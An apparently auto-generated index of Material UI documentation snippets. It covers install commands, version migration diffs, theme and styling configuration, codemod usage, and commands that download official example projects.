TITLE: Installing Material UI with NPM
DESCRIPTION: Command to install Material UI and its required emotion dependencies in a project. This installs the next version of Material UI along with the necessary styling dependencies.

LANGUAGE: bash
CODE:
npm install @mui/material@next @emotion/react @emotion/styled

----------------------------------------

TITLE: Renaming fade to alpha
DESCRIPTION: Replace fade() function with alpha() for better clarity on its functionality.

LANGUAGE: diff
CODE:
-import { fade } from '@mui/material/styles';
+import { alpha } from '@mui/material/styles';

  const classes = makeStyles(theme => ({
-  backgroundColor: fade(theme.palette.primary.main, theme.palette.action.selectedOpacity),
+  backgroundColor: alpha(theme.palette.primary.main, theme.palette.action.selectedOpacity),
  }));

----------------------------------------

TITLE: Custom Theme Transform Function
DESCRIPTION: Implementation of the transform function used for sizing properties in the sx prop system.

LANGUAGE: js
CODE:
function transform(value) {
  return value <= 1 && value !== 0 ? `${value * 100}%` : value;
}

----------------------------------------

TITLE: Updating Grid Size Props
DESCRIPTION: Examples showing how to update grid size props to the new format, including converting breakpoint props to the size prop object and handling the 'grow' value.

LANGUAGE: diff
CODE:
 <Grid
-  xs={12}
-  sm={6}
+  size={{ xs: 12, sm: 6 }}
 >

LANGUAGE: diff
CODE:
-<Grid xs={6}>
+<Grid size={6}>

LANGUAGE: diff
CODE:
-<Grid xs>
+<Grid size="grow">

----------------------------------------

TITLE: Running Visual Regression Tests in Watch Mode
DESCRIPTION: This command runs the visual regression tests in watch mode, allowing for continuous testing during development.

LANGUAGE: bash
CODE:
pnpm test:regressions:run --watch

----------------------------------------

TITLE: Using Higher-order Component API for Styling
DESCRIPTION: Demonstrates the use of withStyles higher-order component to apply styles to a Material UI Button component.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import PropTypes from 'prop-types';
import { withStyles } from '@mui/styles';
import Button from '@mui/material/Button';

const styles = {
  root: {
    background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',
    border: 0,
    borderRadius: 3,
    boxShadow: '0 3px 5px 2px rgba(255, 105, 135, .3)',
    color: 'white',
    height: 48,
    padding: '0 30px',
  },
};

function HigherOrderComponent(props) {
  const { classes } = props;
  return <Button className={classes.root}>Higher-order component</Button>;
}

HigherOrderComponent.propTypes = {
  classes: PropTypes.object.isRequired,
};

export default withStyles(styles)(HigherOrderComponent);

----------------------------------------

TITLE: Material UI Version Header
DESCRIPTION: Markdown header defining version numbers and release dates for MUI releases

LANGUAGE: markdown
CODE:
# [Versions](https://mui.com/versions/)

## 7.0.0-beta.3

_Mar 5, 2025_

----------------------------------------

TITLE: Displaying Repository Relocation Notice in Markdown
DESCRIPTION: This Markdown snippet provides a concise message about the new location of the Pigment CSS package, including a hyperlink to the new repository.

LANGUAGE: Markdown
CODE:
# Pigment CSS

The package has moved [here](https://github.com/mui/pigment-css).

----------------------------------------

TITLE: System Import Example
DESCRIPTION: Shows how to import the spacing utility from MUI system.

LANGUAGE: js
CODE:
import { spacing } from '@mui/system';

----------------------------------------

TITLE: System Import Example
DESCRIPTION: Shows how to import the spacing utility from MUI system.

LANGUAGE: js
CODE:
import { spacing } from '@mui/system';

----------------------------------------

TITLE: Styling MUI Base Button with CSS
DESCRIPTION: Example of styling MUI Base Button using CSS classes

LANGUAGE: css
CODE:
.btn {
  background-color: #1f883d;
  /* the rest of the styles */
}

----------------------------------------

TITLE: Renaming createMuiTheme to createTheme
DESCRIPTION: Replace createMuiTheme function with createTheme for more intuitive naming.

LANGUAGE: diff
CODE:
-import { createMuiTheme } from '@mui/material/styles';
+import { createTheme } from '@mui/material/styles';

-const theme = createMuiTheme({
+const theme = createTheme({

----------------------------------------

TITLE: Building Workspace Packages with PNPM
DESCRIPTION: Command to build all packages in the workspace, which must be run before starting the project.

LANGUAGE: bash
CODE:
pnpm build

----------------------------------------

TITLE: Installing Material UI Vite Example
DESCRIPTION: Commands to download and extract the Material UI Vite example project from the official repository

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/material-ui-vite
cd material-ui-vite

----------------------------------------

TITLE: Updating makeStyles import and usage
DESCRIPTION: Change makeStyles import to @mui/styles and wrap with ThemeProvider.

LANGUAGE: diff
CODE:
-import { makeStyles } from '@mui/material/styles';
+import { makeStyles } from '@mui/styles';
+import { createTheme, ThemeProvider } from '@mui/material/styles';

+const theme = createTheme();
  const useStyles = makeStyles((theme) => ({
    background: theme.palette.primary.main,
  }));
  function Component() {
    const classes = useStyles();
    return <div className={classes.root} />
  }

  // In the root of your app
  function App(props) {
-  return <Component />;
+  return <ThemeProvider theme={theme}><Component {...props} /></ThemeProvider>;
  }

----------------------------------------

TITLE: MUI Video Component Embedding
DESCRIPTION: HTML video element configuration for demonstrating the TextareaAutosize component functionality with autoplay and loop settings.

LANGUAGE: html
CODE:
<video style="margin-bottom: 24px;" autoplay muted loop playsinline>
  <source src="/static/blog/june-2019-update/textarea-autosize.mp4" type="video/mp4" />
</video>

----------------------------------------

TITLE: Migrating Flat Button Component
DESCRIPTION: Diff showing the changes required to migrate the Flat Button component from v0.x to v1.x.

LANGUAGE: diff
CODE:
-import FlatButton from 'material-ui/FlatButton';
+import Button from '@material-ui/core/Button';

-<FlatButton />
+<Button />

----------------------------------------

TITLE: Migrating Flat Button Component
DESCRIPTION: Diff showing the changes required to migrate the Flat Button component from v0.x to v1.x.

LANGUAGE: diff
CODE:
-import FlatButton from 'material-ui/FlatButton';
+import Button from '@material-ui/core/Button';

-<FlatButton />
+<Button />

----------------------------------------

TITLE: Installing Material Icons and Dependencies with Yarn
DESCRIPTION: Command to install @mui/icons-material, @mui/material, and required Emotion packages using Yarn. This installs the next versions of the MUI packages.

LANGUAGE: bash
CODE:
yarn add @mui/icons-material@next @mui/material@next @emotion/styled @emotion/react

----------------------------------------

TITLE: Updating Ripple Effect Tests
DESCRIPTION: Example of updating tests involving components with ripple effect.

LANGUAGE: diff
CODE:
- fireEvent.click(button);
+ await act(async () => fireEvent.mouseDown(button));

----------------------------------------

TITLE: Running MUI Base Next.js Project
DESCRIPTION: Commands to install dependencies and start the development server for the MUI Base Next.js example project.

LANGUAGE: bash
CODE:
npm install
npm run dev

----------------------------------------

TITLE: Running Material UI Vite Project
DESCRIPTION: Commands to install dependencies and start the development server for the Material UI Vite project

LANGUAGE: bash
CODE:
npm install
npm run dev

----------------------------------------

TITLE: Using useTheme Hook with CSS Variables in Joy UI
DESCRIPTION: This example demonstrates how to use the useTheme hook to access CSS variables in a component.

LANGUAGE: jsx
CODE:
import { useTheme } from '@mui/joy/styles';

const SomeComponent = () => {
  const theme = useTheme(); // The runtime theme.

  return (
    <div>
      <p style={{ color: {theme.vars.palette.primary[500]} }}>Some text here.</p>
    </div>
  );
};

----------------------------------------

TITLE: Defining Autocomplete Options Structure in TypeScript
DESCRIPTION: This snippet shows the default options structure accepted by the Autocomplete component, including both object and string types.

LANGUAGE: typescript
CODE:
interface AutocompleteOption {
  label: string;
}
// or
type AutocompleteOption = string;

----------------------------------------

TITLE: Table Pagination Basic HTML Structure
DESCRIPTION: The default HTML structure of the Table Pagination component showing all internal slots including toolbar, spacer, select controls, and navigation buttons.

LANGUAGE: html
CODE:
<td class="base-TablePagination-root">
  <div class="base-TablePagination-toolbar">
    <div class="base-TablePagination-spacer"></div>
    <p class="base-TablePagination-selectLabel" id="mui-48">Rows per page:</p>
    <select class="base-TablePagination-select">
      <option class="base-TablePagination-menuItem">All</option>
    </select>
    <p class="base-TablePagination-displayedRows">1–5 of 13</p>
    <div class="base-TablePagination-actions">
      <button disabled="" aria-label="Go to first page" title="Go to first page">
        <span>|⇽</span>
      </button>
      <button
        disabled=""
        aria-label="Go to previous page"
        title="Go to previous page"
      >
        <span>⇽</span>
      </button>
      <button aria-label="Go to next page" title="Go to next page">
        <span>⇾</span>
      </button>
      <button aria-label="Go to last page" title="Go to last page">
        <span>⇾|</span>
      </button>
    </div>
  </div>
</td>

----------------------------------------

TITLE: Implementing Sync-Generated Theme in React Application
DESCRIPTION: This snippet demonstrates how to add a Sync-generated theme to a React application using Material UI's ThemeProvider. It includes custom shape settings and component style overrides for the Switch component.

LANGUAGE: tsx
CODE:
import { createTheme, ThemeProvider } from '@mui/material/styles';

const theme = createTheme({
  cssVariables: true,
  shape: {
    borderRadiusRound: 999,
  },
  components: {
    MuiSwitch: {
      styleOverrides: {
        root: {
          '&.MuiSwitch-sizeMedium:has(.MuiSwitch-colorPrimary)': {
            '&:has(.Mui-checked):not(:has(.Mui-disabled)):not(:has(.Mui-focusVisible))': {
              width: '40px',
              height: '21px',
              padding: '0',
              '& .MuiSwitch-switchBase': {
                transform: 'translateX(19px) translateY(2px)',
                padding: '0',
                '& .MuiSwitch-thumb': {
                  width: '17px',
                  height: '17px',
                  background: '#FAFAFA',
                },
                '& + .MuiSwitch-track': {
                  width: '38px',
                  height: '21px',
                  background: 'var(--mui-palette-success-light)',
                  borderRadius: 'var(--mui-shape-borderRadiusRound)',
                  opacity: '1',
                },
              },
            },
          },
        },
      },
    },
  },
});

export default function MyApp(props) {
  const { Component, pageProps } = props;

  return (
    <ThemeProvider theme={theme}>
      <Component {...pageProps} />
    </ThemeProvider>
  );
}

----------------------------------------

TITLE: Installing and Running Material UI Example Project with npm
DESCRIPTION: Commands to install project dependencies and start the development server using npm.

LANGUAGE: bash
CODE:
npm install
npm start

----------------------------------------

TITLE: Downloading and Extracting Material UI Vite TypeScript Example
DESCRIPTION: Commands to download the Material UI Vite TypeScript example from GitHub and navigate to the project directory.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/material-ui-vite-ts
cd material-ui-vite-ts

----------------------------------------

TITLE: Updating styled import and usage
DESCRIPTION: Change styled import to @mui/styles and wrap with ThemeProvider.

LANGUAGE: diff
CODE:
-import { styled } from '@mui/material/styles';
+import { styled } from '@mui/styles';
+import { createTheme, ThemeProvider } from '@mui/material/styles';

+const theme = createTheme();
  const MyComponent = styled('div')(({ theme }) => ({ background: theme.palette.primary.main }));

  function App(props) {
-  return <MyComponent />;
+  return <ThemeProvider theme={theme}><MyComponent {...props} /></ThemeProvider>;
  }

----------------------------------------

TITLE: Configuring On-Demand Throughput for DynamoDB Table
DESCRIPTION: This bash snippet shows how to configure on-demand throughput for the DynamoDB table instead of provisioned throughput. It replaces the provisioned throughput parameter with billing mode.

LANGUAGE: bash
CODE:
--billing-mode PAY_PER_REQUEST \

----------------------------------------

TITLE: Root Component Import Setup
DESCRIPTION: Example of importing the ClassNameGenerator configuration file before other MUI components.

LANGUAGE: javascript
CODE:
import './MuiClassNameSetup';
import Button from '@mui/material/Button';
// ...other component imports

function App() {
  return <Button>Text</Button>;
}

----------------------------------------

TITLE: Component Class Name Renaming
DESCRIPTION: Example of removing the 'Mui' prefix from component class names using ClassNameGenerator.

LANGUAGE: javascript
CODE:
import { unstable_ClassNameGenerator as ClassNameGenerator } from '@mui/material/className';

ClassNameGenerator.configure((componentName) => componentName.replace('Mui', ''));

----------------------------------------

TITLE: Adding Custom Theme Tokens in MUI
DESCRIPTION: Implementation of custom theme tokens and color schemes with CSS variables support

LANGUAGE: js
CODE:
const theme = createTheme({
  cssVariables: true,
  colorSchemes: {
    light: {
      palette: {
        gradient:
          'linear-gradient(to left, var(--mui-palette-primary-main), var(--mui-palette-primary-dark))',
        border: {
          subtle: 'var(--mui-palette-neutral-200)',
        },
      },
    },
    dark: {
      palette: {
        gradient:
          'linear-gradient(to left, var(--mui-palette-primary-light), var(--mui-palette-primary-main))',
        border: {
          subtle: 'var(--mui-palette-neutral-600)',
        },
      },
    },
  },
});

function App() {
  return <ThemeProvider theme={theme}>...</ThemeProvider>;
}

----------------------------------------

TITLE: Configuring TypeScript Paths for MUI Styled Engine
DESCRIPTION: TSConfig path configuration required to use styled-components with Material UI in TypeScript. This maps the styled engine to use the styled-components implementation.

LANGUAGE: json
CODE:
"paths": {
  "@mui/styled-engine": ["./node_modules/@mui/styled-engine-sc"]
}

----------------------------------------

TITLE: Downloading and Extracting Material UI Next.js Example
DESCRIPTION: Commands to download and extract the Material UI Next.js example project from GitHub repository. This creates a local copy of the project that can be used as a starting point.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-nextjs
cd material-ui-nextjs

----------------------------------------

TITLE: Customizing Group Value Generation
DESCRIPTION: Shows how to implement custom grouping logic using groupingValueGetter. This example groups movies by decades instead of exact release dates.

LANGUAGE: javascript
CODE:
groupingValueGetter: ({ value }) => `${Math.floor(value.getFullYear() / 10)}0's`;

----------------------------------------

TITLE: MUI Typography System Import
DESCRIPTION: Example of importing typography utilities from MUI system.

LANGUAGE: js
CODE:
import { typography } from '@mui/system';

----------------------------------------

TITLE: Custom Prefix Configuration Example
DESCRIPTION: Example of changing the default MUI class name prefix using ClassNameGenerator.

LANGUAGE: javascript
CODE:
import { unstable_ClassNameGenerator as ClassNameGenerator } from '@mui/material/className';

ClassNameGenerator.configure((componentName) => `foo-bar-${componentName}`);

----------------------------------------

TITLE: Installing TypeScript Types for Styled Components
DESCRIPTION: Command to install TypeScript type definitions for styled-components as a development dependency.

LANGUAGE: bash
CODE:
npm install --save-dev @types/styled-components

----------------------------------------

TITLE: Downloading and Setting Up Joy UI CRA TypeScript Example
DESCRIPTION: This snippet shows how to download the Joy UI Create React App TypeScript example from the Material-UI repository and navigate to the project directory.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/joy-ui-cra-ts
cd joy-ui-cra-ts

----------------------------------------

TITLE: Renaming gap props in System
DESCRIPTION: Rename gridGap, gridRowGap, and gridColumnGap to gap, rowGap, and columnGap respectively.

LANGUAGE: diff
CODE:
  <Box
-  gap={2}
+  gap="2px"
  >

----------------------------------------

TITLE: Configuring Responsive Font Sizes in Material-UI
DESCRIPTION: Example showing how to use responsiveFontSizes() to create responsive typography in Material-UI themes. This allows font sizes to automatically adjust based on screen size.

LANGUAGE: javascript
CODE:
responsiveFontSizes()

----------------------------------------

TITLE: MUI Codemod Command
DESCRIPTION: Command to run the codemod for migrating sx prop callback syntax to the new format.

LANGUAGE: bash
CODE:
npx @mui/codemod@latest v6.0.0/sx-prop path/to/file-or-folder

----------------------------------------

TITLE: Rendering Basic Timeline in React
DESCRIPTION: Demonstrates how to create a basic timeline showing a list of events in chronological order.

LANGUAGE: jsx
CODE:
{"demo": "BasicTimeline.js"}

----------------------------------------

TITLE: Downloading and Setting Up Material UI Next.js Example
DESCRIPTION: Commands to download the Material UI Next.js TypeScript example project from GitHub and navigate to the project directory.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-nextjs-ts
cd material-ui-nextjs-ts

----------------------------------------

TITLE: Installing and Running MUI Base Vite.js Example
DESCRIPTION: Commands to install project dependencies and start the development server for the MUI Base Vite.js example with Tailwind CSS.

LANGUAGE: bash
CODE:
npm install
npm start

----------------------------------------

TITLE: Defining Primary Color Scheme in JavaScript for MUI Theme
DESCRIPTION: This code snippet demonstrates how to define a primary color scheme and extend the MUI theme with custom color values. It includes color definitions and theme customization for light mode.

LANGUAGE: javascript
CODE:
const primary = {
  50: '#F4FAFF',
  100: '#DDF1FF',
  200: '#ADDBFF',
};

extendTheme({
  colorSchemes: {
    light: {
      palette: {
        primary: {
          ...primary,
          plainColor: `var(--joy-palette-primary-600)`,
          plainHoverBg: `var(--joy-palette-primary-100)`,
          plainActiveBg: `var(--joy-palette-primary-200)`,
          plainDisabledColor: `var(--joy-palette-primary-200)`,
        },
      },
    },
  },
});

----------------------------------------

TITLE: Custom Breakpoints Configuration with TypeScript
DESCRIPTION: Example showing how to configure custom breakpoints in MUI theme with TypeScript support.

LANGUAGE: typescript
CODE:
declare module '@mui/material/styles' {
  interface BreakpointOverrides {
    xs: false; // removes the `xs` breakpoint
    sm: false;
    md: false;
    lg: false;
    xl: false;
    tablet: true; // adds the `tablet` breakpoint
    laptop: true;
    desktop: true;
  }
}

----------------------------------------

TITLE: Importing useFormControlContext Hook
DESCRIPTION: Basic import statement for the useFormControlContext hook from MUI Base.

LANGUAGE: jsx
CODE:
import { useFormControlContext } from '@mui/base/FormControl';

----------------------------------------

TITLE: Installing Material Icons and Dependencies with pnpm
DESCRIPTION: Command to install @mui/icons-material, @mui/material, and required Emotion packages using pnpm. This installs the next versions of the MUI packages.

LANGUAGE: bash
CODE:
pnpm add @mui/icons-material@next @mui/material@next @emotion/styled @emotion/react

----------------------------------------

TITLE: Running Material UI Next.js Project
DESCRIPTION: Commands to install dependencies and start the development server for the Next.js project

LANGUAGE: bash
CODE:
npm install
npm run dev

----------------------------------------

TITLE: Installing Material UI Next.js Example
DESCRIPTION: Commands to download and extract the Material UI with Pigment CSS example project from GitHub repository

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-pigment-css-nextjs-ts
cd material-ui-pigment-css-nextjs-ts

----------------------------------------

TITLE: Migrating system props to sx prop in Material UI v5
DESCRIPTION: Example of moving system props like mt and bgcolor to the sx prop

LANGUAGE: JavaScript
CODE:
-<Button mr={2}>
+<Button sx={{ mr: 2 }}>

----------------------------------------

TITLE: Running a Codemod Script
DESCRIPTION: Basic command to execute a codemod transformation on specified path

LANGUAGE: bash
CODE:
npx @mui/codemod@latest <codemod> <paths...>

----------------------------------------

TITLE: Running a Codemod Script
DESCRIPTION: Basic command to execute a codemod transformation on specified path

LANGUAGE: bash
CODE:
npx @mui/codemod@latest <codemod> <paths...>

----------------------------------------

TITLE: Adding Custom Class to Badge Slot in React
DESCRIPTION: Shows how to use the slotProps prop to add a custom CSS class to the badge slot of a Badge component.

LANGUAGE: jsx
CODE:
<Badge slotProps={{ badge: { className: 'my-badge' } }} />

----------------------------------------

TITLE: Customizing Slots - React/JSX
DESCRIPTION: Example of customizing the root and toolbar slots of the TablePagination component.

LANGUAGE: jsx
CODE:
<TablePagination slots={{ root: 'div', toolbar: 'nav' }} />

----------------------------------------

TITLE: Toolpad Dialog Management Implementation
DESCRIPTION: Advanced dialog management using the useDialogs hook from Toolpad, demonstrating chained dialog operations with error handling.

LANGUAGE: tsx
CODE:
const handleDelete = async () => {
  const id = await dialogs.prompt('Enter the ID to delete', {
    okText: 'Delete',
    cancelText: 'Cancel',
  });

  if (id) {
    const deleteConfirmed = await dialogs.confirm(
      `Are you sure you want to delete "${id}"?`,
    );
    if (deleteConfirmed) {
      try {
        setIsDeleting(true);
        await mockApiDelete(id);
        dialogs.alert('Deleted!');
      } catch (error) {
        const message = error instanceof Error ? error.message : 'Unknown error';
        await dialogs.open(MyCustomDialog, { id, error: message });
      } finally {
        setIsDeleting(false);
      }
    }
  }
};

----------------------------------------

TITLE: Installing Material UI CDN Example
DESCRIPTION: Commands to download and set up the Material UI CDN example project from the repository.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-via-cdn
cd material-ui-via-cdn

----------------------------------------

TITLE: Grid Codemod Commands
DESCRIPTION: Terminal commands for running automated codemods to update Grid props for different Material UI versions.

LANGUAGE: bash
CODE:
npx @mui/codemod@next v7.0.0/grid-props <path/to/folder>

LANGUAGE: bash
CODE:
npx @mui/codemod@latest v6.0.0/grid-v2-props <path/to/folder>

----------------------------------------

TITLE: Configuring no-restricted-imports for MUI in ESLint
DESCRIPTION: This snippet shows how to configure the 'no-restricted-imports' rule in ESLint to restrict certain import patterns in MUI projects. It prevents imports from deeply nested @mui paths.

LANGUAGE: json
CODE:
{
  "rules": {
    "no-restricted-imports": [
      "error",
      {
        "patterns": ["@mui/*/*/*"]
      }
    ]
  }
}

----------------------------------------

TITLE: Using createStyles with TypeScript
DESCRIPTION: Shows how to use createStyles with makeStyles to properly type style objects when using TypeScript with theme integration.

LANGUAGE: jsx
CODE:
import { createStyles, makeStyles } from '@mui/styles';
import { createTheme, ThemeProvider } from '@mui/material/styles';

const useStyles = makeStyles((theme: Theme) =>
  createStyles({
    root: {
      backgroundColor: theme.palette.red,
    },
  }),
);

const theme = createTheme();

export default function MyComponent() {
  const classes = useStyles();
  return (
    <ThemeProvider theme={theme}>
      <div className={classes.root} />
    </ThemeProvider>
  );
}

----------------------------------------

TITLE: Installing Material Icons and Dependencies with npm
DESCRIPTION: Command to install @mui/icons-material, @mui/material, and required Emotion packages using npm. This installs the next versions of the MUI packages.

LANGUAGE: bash
CODE:
npm install @mui/icons-material@next @mui/material@next @emotion/styled @emotion/react

----------------------------------------

TITLE: Configuring Tailwind CSS with Next.js App Router
DESCRIPTION: Configuration setup for Tailwind CSS in a Next.js project, specifying content paths for the app directory structure.

LANGUAGE: javascript
CODE:
/** @type {import('tailwindcss').Config} */
module.exports = {
  content: [
    './src/app/**/*.{js,ts,jsx,tsx,mdx}',
    './src/components/**/*.{js,ts,jsx,tsx,mdx}'
    // or if not using the `src` directory:
    './app/**/*.{js,ts,jsx,tsx,mdx}',
  ],
  theme: {
    extend: {},
  },
  plugins: [],
};

----------------------------------------

TITLE: Installing @mui/docs Package with npm
DESCRIPTION: This command installs the @mui/docs package using npm. It specifically installs the 'next' version of the package.

LANGUAGE: bash
CODE:
npm install @mui/docs@next

----------------------------------------

TITLE: Installing MUI System with styled-components using pnpm
DESCRIPTION: Command to install MUI System with styled-components styling engine using pnpm

LANGUAGE: bash
CODE:
pnpm add @mui/system@next @mui/styled-engine-sc@next styled-components

----------------------------------------

TITLE: Updating AccordionSummary CSS classes in Material UI v5
DESCRIPTION: Example of updating the CSS class for AccordionSummary content gutters

LANGUAGE: JavaScript
CODE:
-.MuiAccordionSummary-root .MuiAccordionSummary-contentGutters
+.MuiAccordionSummary-root.MuiAccordionSummary-gutters .MuiAccordionSummary-content

----------------------------------------

TITLE: Rendering Rich Tree View with Dataset in React
DESCRIPTION: Demonstrates how to use the new Rich Tree View component with a sample dataset. The component simplifies rendering tree structures by handling most complexities internally.

LANGUAGE: javascript
CODE:
const myDataSet = [
  {
    id: 'node-1',
    label: 'Node 1',
    children: [
      { id: 'node-1-1', label: 'Node 1.1' },
      { id: 'node-1-2', label: 'Node 1.2' },
    ],
  },
  {
    id: 'node-2',
    label: 'Node 2',
  },
];

LANGUAGE: jsx
CODE:
<RichTreeView items={myDataSet} multiSelect />

----------------------------------------

TITLE: Running Real-world Load Test Benchmarks
DESCRIPTION: Load testing results using Bombardier to benchmark server performance under sustained load. Tests avatar endpoint with 100 concurrent connections over 30 seconds.

LANGUAGE: bash
CODE:
pnpm server:server

bombardier \
  -c 100 \
  -l \
  -d 30s \
  -m GET \
  '0.0.0.0:3001/avatar'

Statistics        Avg      Stdev        Max
  Reqs/sec       442.47      55.44     547.63
  Latency      225.64ms    17.11ms   471.31ms
  Latency Distribution
     50%   221.98ms
     75%   230.69ms
     90%   241.19ms
     95%   247.87ms
     99%   273.88ms
  HTTP codes:
    1xx - 0, 2xx - 26642, 3xx - 0, 4xx - 0, 5xx - 0
    others - 0
  Throughput:    11.61MB/s

----------------------------------------

TITLE: HTML Badge Display Section
DESCRIPTION: Status badges section showing various project metrics and statuses using HTML div for alignment.

LANGUAGE: HTML
CODE:
<div align="center">

[![license](https://img.shields.io/badge/license-MIT-blue.svg)](https://github.com/mui/material-ui/blob/HEAD/LICENSE)
[![npm latest package](https://img.shields.io/npm/v/@mui/material/latest.svg)](https://www.npmjs.com/package/@mui/material)

</div>

----------------------------------------

TITLE: Installing and Running the Material UI Next.js Project
DESCRIPTION: Commands to install project dependencies and start the development server for the Material UI Next.js application.

LANGUAGE: bash
CODE:
npm install
npm run dev

----------------------------------------

TITLE: Installing @mui/material Package with npm
DESCRIPTION: This command installs the @mui/material package, which is a peer dependency of @mui/docs. It installs the 'next' version of the Material UI core components.

LANGUAGE: bash
CODE:
npm install @mui/material@next

----------------------------------------

TITLE: Running ListItemButton Codemod
DESCRIPTION: Command to run the codemod for migrating to ListItemButton.

LANGUAGE: bash
CODE:
npx @mui/codemod@latest v6.0.0/list-item-button-prop <path/to/folder>

----------------------------------------

TITLE: Transformed Import Statements in TSX
DESCRIPTION: Example of import statements after the plugin transformation, showing ESM-compatible format with explicit .js extensions.

LANGUAGE: tsx
CODE:
// packages/mui-material/build/index.js
export * from './Accordion/index.js';

// packages/mui-material/build/Breadcrumbs/BreadcrumbCollapsed.js
import MoreHorizIcon from '../internal/svg-icons/MoreHoriz.js';

----------------------------------------

TITLE: Non-serializable Props Example with Joy UI Button
DESCRIPTION: Shows an incorrect implementation using non-serializable props (event handlers) in a server component, which needs to be moved to a client component.

LANGUAGE: tsx
CODE:
import Button from '@mui/joy/Button';
import Sheet from '@mui/joy/Sheet';

export default function Page() {
  return (
    <Sheet>
      <Button
        onClick={() => {
          console.log('handle click');
        }}
      >
        Submit
      </Button>
    </Sheet>
  );
}

----------------------------------------

TITLE: Installing and Running Material UI Preact Example (Bash)
DESCRIPTION: Commands to install the project dependencies and start the development server for the Material UI Preact example.

LANGUAGE: bash
CODE:
npm install
npm run start

----------------------------------------

TITLE: Updating React Version in Package Manager
DESCRIPTION: Commands to update React and React DOM to a specific version using different package managers.

LANGUAGE: bash
CODE:
npm install react@<version> react-dom@<version>

LANGUAGE: bash
CODE:
pnpm add react@<version> react-dom@<version>

LANGUAGE: bash
CODE:
yarn add react@<version> react-dom@<version>

----------------------------------------

TITLE: Migrating Alert props in Material UI v5
DESCRIPTION: Examples of updating components and componentsProps props on Alert

LANGUAGE: JavaScript
CODE:
 <Alert
-  components={{ CloseButton: CustomButton }}
+  slots={{ closeButton: CustomButton }}
 />

LANGUAGE: JavaScript
CODE:
 <Alert
-  componentsProps={{ closeButton: { id: 'close-id' } }}
+  slotProps={{ closeButton: { id: 'close-id' } }}
 />

----------------------------------------

TITLE: Handling onInputChange Event in Number Input React Component
DESCRIPTION: This example shows how to handle the onInputChange event of the Number Input component, which provides access to the raw input value before clamping.

LANGUAGE: jsx
CODE:
<NumberInput
  onInputChange={(event) => console.log(`the input value is: ${event.target.value}`)}
/>

----------------------------------------

TITLE: Flex Direction Properties in MUI Box
DESCRIPTION: Demonstrates different flex-direction values that can be applied to MUI Box components.

LANGUAGE: jsx
CODE:
<Box sx={{ flexDirection: 'row' }}>…
<Box sx={{ flexDirection: 'row-reverse' }}>…
<Box sx={{ flexDirection: 'column' }}>…
<Box sx={{ flexDirection: 'column-reverse' }}>…

----------------------------------------

TITLE: Setting Default Row Grouping Configuration
DESCRIPTION: Demonstrates how to set initial row grouping configuration using the initialState prop. This example shows grouping by Director and BoxOffice columns.

LANGUAGE: javascript
CODE:
<DataGridPro
  experimentalFeatures={{ rowGrouping: true }}
  initialState={{
    rowGrouping: {
      model: ['Director', 'BoxOffice'],
    },
  }}
  {...otherProps}
/>

----------------------------------------

TITLE: Installing and Running the Material UI CRA Tailwind TypeScript Project
DESCRIPTION: These bash commands install the project dependencies and start the development server for the Material UI CRA example with Tailwind CSS in TypeScript.

LANGUAGE: bash
CODE:
npm install
npm start

----------------------------------------

TITLE: Updating tsconfig.json for styled-components with Material UI
DESCRIPTION: This snippet shows the necessary changes to the tsconfig.json file to support the use of @mui/styled-engine-sc in a TypeScript project.

LANGUAGE: diff
CODE:
 {
   "compilerOptions": {
+    "paths": {
+      "@mui/styled-engine": ["./node_modules/@mui/styled-engine-sc"]
+    }
   },
 }

----------------------------------------

TITLE: Applying Color Inversion with sx Prop
DESCRIPTION: Demonstrates how to apply color inversion to a Box component using the sx prop and solid inversion utility.

LANGUAGE: jsx
CODE:
<Box sx={[{ ...baseStyles }, applySolidInversion('neutral')]}>...</Box>

----------------------------------------

TITLE: Variable Width Content in Grid
DESCRIPTION: Illustrates how to set a column's size based on its content width by using 'auto' for one of the size breakpoint props.

LANGUAGE: JavaScript
CODE:
{"demo": "VariableWidthGrid.js", "bg": true}

----------------------------------------

TITLE: Importing Modal Component in React
DESCRIPTION: Basic import statement for the Modal component from MUI Base UI library.

LANGUAGE: jsx
CODE:
import { Modal } from '@mui/base/Modal';

----------------------------------------

TITLE: Running Material UI CDN Example
DESCRIPTION: Commands to run the example in a browser, with options for both React 18 and React 19+ versions.

LANGUAGE: bash
CODE:
# React 19 or later
open index.html
# React 18
open react-18-example.html

----------------------------------------

TITLE: Configuring Next.js for styled-components with Material UI
DESCRIPTION: This code snippet illustrates how to modify the next.config.js file to use @mui/styled-engine-sc and transpile necessary modules in a Next.js project.

LANGUAGE: diff
CODE:
+const withTM = require('next-transpile-modules')([
+  '@mui/material',
+  '@mui/system',
+  '@mui/icons-material', // If @mui/icons-material is being used
+]);

+module.exports = withTM({
 webpack: (config) => {
   config.resolve.alias = {
     ...config.resolve.alias,
+    '@mui/styled-engine': '@mui/styled-engine-sc',
    };
    return config;
  }
+});

----------------------------------------

TITLE: Badge Component Root Props - Using slotProps
DESCRIPTION: Example showing how to add props to the Badge component's root slot using the slotProps prop.

LANGUAGE: jsx
CODE:
<Badge slotProps={{ root: { id: 'badge1' } }}>

----------------------------------------

TITLE: Creating Class Name Generator with StylesProvider
DESCRIPTION: Demonstrates how to create and use a custom class name generator with StylesProvider component for JSS styling.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import { StylesProvider, createGenerateClassName } from '@mui/styles';

const generateClassName = createGenerateClassName({
  productionPrefix: 'c',
});

export default function App() {
  return <StylesProvider generateClassName={generateClassName}>...</StylesProvider>;
}

----------------------------------------

TITLE: Babel Configuration for Component Selectors
DESCRIPTION: Configuration for @emotion/babel-plugin to enable component selector functionality with MUI's styled() utility

LANGUAGE: javascript
CODE:
module.exports = {
  ...
  plugins: [
    [
